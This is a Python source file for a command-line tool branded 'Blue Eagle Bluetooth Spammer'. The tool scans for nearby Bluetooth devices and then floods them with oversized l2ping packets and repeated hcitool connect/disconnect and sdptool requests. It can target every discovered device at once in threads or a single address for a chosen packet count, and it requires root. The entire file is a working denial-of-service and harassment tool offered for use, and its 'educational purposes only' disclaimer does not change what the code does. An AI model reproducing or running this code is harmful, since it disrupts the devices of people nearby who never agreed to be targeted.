#!/usr/bin/env python3
"""
Blue Eagle Bluetooth Spammer Tool
Created by HUBAX Team - n0merc
Use at your own risk. This tool is for educational purposes only.
"""

import sys
import os
import time
import subprocess
from threading import Thread
import bluetooth

# ASCII Art Logo - Blue Eagle
LOGO = """
██████╗ ██╗     ██╗   ██╗███████╗    ███████╗ █████╗  ██████╗ ██╗     ███████╗
██╔══██╗██║     ██║   ██║██╔════╝    ██╔════╝██╔══██╗██╔════╝ ██║     ██╔════╝
██████╔╝██║     ██║   ██║█████╗      █████╗  ███████║██║  ███╗██║     █████╗  
██╔══██╗██║     ██║   ██║██╔══╝      ██╔══╝  ██╔══██║██║   ██║██║     ██╔══╝  
██████╔╝███████╗╚██████╔╝███████╗    ███████╗██║  ██║╚██████╔╝███████╗███████╗
╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝    ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
                                                     v1.0  by n0merc                                                                             
"""

class BlueEagleSpammer:
    def __init__(self):
        self.targets = []
        self.spamming = False

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def display_logo(self):
        self.clear_screen()
        print("\033[94m" + LOGO + "\033[0m")  # Blue color for logo
        print("\033[91m" + "="*80 + "\033[0m")
        print("\033[93m" + "BLUE EAGLE BLUETOOTH SPAMMER TOOL" + "\033[0m")
        print("\033[91m" + "="*80 + "\033[0m")
        print("\033[91m" + "WARNING: This tool is for educational purposes only. Use responsibly!" + "\033[0m")
        print("\033[91m" + "="*80 + "\033[0m\n")

    def scan_devices(self):
        print("\033[92m[*] Scanning for nearby Bluetooth devices...\033[0m")
        try:
            nearby_devices = bluetooth.discover_devices(lookup_names=True, duration=8)
            if not nearby_devices:
                print("\033[91m[!] No devices found. Make sure Bluetooth is enabled.\033[0m")
                return
            
            print("\033[92m[+] Found devices:\033[0m")
            for i, (addr, name) in enumerate(nearby_devices):
                print(f"    {i+1}. {name} ({addr})")
                self.targets.append(addr)
            
            print(f"\n\033[92m[+] Total devices found: {len(nearby_devices)}\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Error during scan: {e}\033[0m")

    def spam_device(self, target_addr):
        print(f"\033[91m[+] Spamming device: {target_addr}\033[0m")
        
        # Different spam techniques
        techniques = [
            f"l2ping -i hci0 -s 600 {target_addr}",
            f"hcitool cc {target_addr} && hcitool dc {target_addr}",
            f"sdptool browse {target_addr}",
        ]
        
        try:
            while self.spamming:
                for tech in techniques:
                    if not self.spamming:
                        break
                    try:
                        subprocess.run(tech.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                        print(f"\033[93m[*] Sent spam packet to {target_addr}\033[0m")
                        time.sleep(0.5)
                    except:
                        pass
        except KeyboardInterrupt:
            print("\033[91m[!] Spamming stopped by user.\033[0m")

    def spam_all_devices(self):
        if not self.targets:
            print("\033[91m[!] No targets found. Scan for devices first.\033[0m")
            return
        
        print("\033[91m[+] Starting spam attack on all discovered devices...\033[0m")
        self.spamming = True
        
        threads = []
        for target in self.targets:
            t = Thread(target=self.spam_device, args=(target,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            while self.spamming:
                time.sleep(1)
        except KeyboardInterrupt:
            self.spamming = False
            print("\033[91m[!] Stopping all spam threads...\033[0m")
            time.sleep(2)

    def custom_spam(self):
        target = input("\033[93m[?] Enter target Bluetooth address: \033[0m").strip()
        if not target:
            print("\033[91m[!] Invalid address.\033[0m")
            return
        
        count = input("\033[93m[?] Number of spam packets (default: 100): \033[0m").strip()
        count = int(count) if count.isdigit() else 100
        
        print(f"\033[91m[+] Sending {count} spam packets to {target}...\033[0m")
        
        for i in range(count):
            try:
                subprocess.run(f"l2ping -i hci0 -s 300 {target}".split(), 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1)
                print(f"\033[93m[*] Packet {i+1}/{count} sent to {target}\033[0m")
                time.sleep(0.2)
            except:
                print(f"\033[91m[!] Failed to send packet {i+1}\033[0m")
        
        print("\033[92m[+] Custom spam completed.\033[0m")

    def show_menu(self):
        menu = """
\033[94m[ MAIN MENU ]\033[0m
1. Scan for nearby Bluetooth devices
2. Spam all discovered devices
3. Custom spam to specific device
4. Clear target list
5. Show discovered devices
6. Exit

\033[93mSelect an option: \033[0m"""
        return menu

    def run(self):
        self.display_logo()
        
        while True:
            try:
                print(self.show_menu())
                choice = input().strip()
                
                if choice == '1':
                    self.scan_devices()
                elif choice == '2':
                    self.spam_all_devices()
                elif choice == '3':
                    self.custom_spam()
                elif choice == '4':
                    self.targets = []
                    print("\033[92m[+] Target list cleared.\033[0m")
                elif choice == '5':
                    if self.targets:
                        print("\033[92m[+] Discovered devices:\033[0m")
                        for i, addr in enumerate(self.targets):
                            print(f"    {i+1}. {addr}")
                    else:
                        print("\033[91m[!] No devices in list.\033[0m")
                elif choice == '6':
                    print("\033[91m[+] Exiting Blue Eagle Spammer. Stay safe!\033[0m")
                    break
                else:
                    print("\033[91m[!] Invalid option.\033[0m")
                
                input("\n\033[93mPress Enter to continue...\033[0m")
                self.display_logo()
                
            except KeyboardInterrupt:
                print("\n\033[91m[!] Interrupted by user. Exiting...\033[0m")
                break
            except Exception as e:
                print(f"\033[91m[!] Error: {e}\033[0m")

if __name__ == "__main__":
    # Check if running as root (required for Bluetooth operations on Linux)
    if os.name == 'posix' and os.geteuid() != 0:
        print("\033[91m[!] This tool requires root privileges on Linux. Run with sudo!\033[0m")
        sys.exit(1)
    
    try:
        spammer = BlueEagleSpammer()
        spammer.run()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Tool terminated.\033[0m")
